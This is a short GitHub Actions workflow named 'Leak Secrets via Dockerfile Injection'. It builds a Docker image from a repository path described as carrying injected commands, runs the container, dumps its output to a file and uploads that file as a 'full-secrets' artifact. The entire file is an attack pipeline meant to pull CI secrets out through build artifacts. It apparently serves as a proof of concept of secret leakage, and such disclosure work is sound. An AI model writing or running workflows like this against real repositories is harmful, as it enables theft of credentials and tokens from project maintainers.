name: Leak Secrets via Dockerfile Injection

on:
  workflow_dispatch:

jobs:
  leak:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Build Docker image with injected commands
        run: |
          docker build --no-cache -t secretleak ./taskcluster/docker/python

      - name: Run container and dump leak
        run: |
          docker run --rm secretleak > full_leak.txt

      - name: Upload leaked secrets as artifact
        uses: actions/upload-artifact@v4
        with:
          name: full-secrets
          path: full_leak.txt
